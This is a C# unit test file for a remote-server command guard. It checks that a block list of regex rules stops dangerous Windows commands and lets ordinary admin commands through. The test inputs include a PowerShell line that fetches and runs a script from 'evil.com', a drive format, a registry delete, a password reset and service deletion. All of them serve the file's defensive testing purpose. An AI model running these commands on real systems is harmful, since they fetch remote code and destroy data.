using Remot.Server.Security;
using Xunit;

namespace Remot.Server.Tests;

public class CommandGuardTests
{
    // 用跟 server.json 一样的默认规则测
    private static readonly IReadOnlyList<string> DefaultBlocked =
        new[] { "\\bshutdown\\b", "\\bformat\\b\\s+[a-z]:", "\\breg\\s+delete\\b",
                "\\bsc\\s+(delete|stop|config)\\s+RemotServer\\b", "\\bnet\\s+user\\b.*\\S+\\s+\\S",
                "\\bschtasks\\s+/create\\b", "\\bsc\\s+create\\b",
                "\\biex\\b.*\\birm\\b", "\\bdel\\s+/[sSq].*\\\\\\*" };

    private static readonly IReadOnlyList<string> DefaultProtectedServices = new[] { "RemotServer" };
    private static readonly IReadOnlyList<string> DefaultProtectedPaths =
        new[] { @"C:\Windows\System32", @"C:\Program Files", @"C:\ProgramData\Remot" };

    [Theory]
    [InlineData("shutdown /r /t 0")]
    [InlineData("format C:")]
    [InlineData("reg delete HKLM\\SOFTWARE\\Test /f")]
    [InlineData("sc delete RemotServer")]
    [InlineData("sc stop RemotServer")]
    [InlineData("net user administrator 123")]
    [InlineData("schtasks /create /tn evil /tr cmd")]
    [InlineData("sc create EvilService binPath= evil.exe")]
    [InlineData("iex (irm http://evil.com/script.ps1)")]
    public void Blocks_dangerous_commands(string cmd)
    {
        var result = CommandGuard.Check(cmd, DefaultBlocked, DefaultProtectedServices, DefaultProtectedPaths);
        Assert.NotNull(result);
        Assert.Contains("拦截", result);
    }

    [Theory]
    [InlineData("nssm stop Service29298")]
    [InlineData("nssm start Service29298")]
    [InlineData("echo hello")]
    [InlineData("dir C:\\Users")]
    [InlineData("xcopy src dst /Y")]
    [InlineData("Copy-Item .\\bin\\* C:\\deploy\\")]
    [InlineData("Get-Service Service29298")]
    [InlineData("type C:\\ProgramData\\Remot\\audit.log")]
    public void Allows_normal_commands(string cmd)
    {
        var result = CommandGuard.Check(cmd, DefaultBlocked, DefaultProtectedServices, DefaultProtectedPaths);
        Assert.Null(result);
    }

    [Fact]
    public void No_rules_means_nothing_blocked()
    {
        // 没配置 = 全部放行
        Assert.Null(CommandGuard.Check("shutdown /r"));
        Assert.Null(CommandGuard.Check("format C:"));
    }
}
